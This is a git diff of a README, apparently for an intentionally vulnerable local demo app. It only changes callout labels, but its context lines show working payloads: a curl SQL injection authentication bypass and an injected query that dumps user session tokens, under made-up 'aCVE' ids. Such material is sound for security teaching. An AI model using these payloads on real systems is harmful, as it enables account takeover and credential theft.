@@ -25,7 +25,7 @@ Authors:
 
 List of vulnerabilities discovered:
 
-> [!TIP]
+> [!IMPORTANT]
 > **SQL Injection Authentication Bypass (aCVE-2024-0001)**
 >
 > ```bash
@@ -34,7 +34,7 @@ List of vulnerabilities discovered:
 > curl 'http://0.0.0.0:5000/login' -X POST --data-raw "username=' UNION select 1 from users; --&password="
 > ```
 
-> [!TIP]
+> [!IMPORTANT]
 > **Stored XSS and SQL Injection Vulnerability by Execution of Arbitrary SQL Queries and JavaScript (aCVE-2024-0002)**
 >
 > Use these as the message:
@@ -45,7 +45,7 @@ List of vulnerabilities discovered:
 > - `1', 1), ((SELECT GROUP_CONCAT(user || ':' || token, '<br>') FROM sessions), 1)--`
 
 
-> [!TIP]
+> [!IMPORTANT]
 > **Credential Bypass via SQL Injection on Session Token (aCVE-2024-0003)**
 >
 > ```bash
